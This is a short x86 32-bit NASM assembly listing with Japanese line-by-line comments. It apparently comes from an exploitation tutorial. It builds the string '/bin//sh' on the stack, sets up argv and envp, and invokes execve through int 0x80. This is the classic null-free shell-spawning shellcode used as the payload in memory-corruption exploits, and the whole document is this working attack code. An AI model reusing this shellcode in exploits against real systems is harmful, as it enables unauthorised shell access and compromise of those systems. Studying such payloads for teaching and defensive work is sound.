BITS 32

; execve(const char *filename, char *const argv [], char *const envp[])
  xor eax, eax      ; eaxをゼロクリアする
  push eax          ; 文字列を終端させるためにnullバイト（複数）を格納する
  push 0x68732f2f   ; "//sh"をスタックにプッシュする
  push 0x6e69622f   ; "/bin"をスタックにプッシュする
  mov ebx, esp      ; "/bin//sh"のアドレスをesp経由でebxに格納する
  push eax          ; スタックに32ビットのnull終端をプッシュする
  mov edx, esp      ; これはenvp用の空の配列である
  push ebx          ; null終端の上にある文字列のアドレスをスタックにプッシュする
  mov ecx, esp      ; これは文字列ポインタを用いたargv用の配列である
  mov al, 11        ; システムコール番号は11
  int 0x80          ; システムコールを実行する
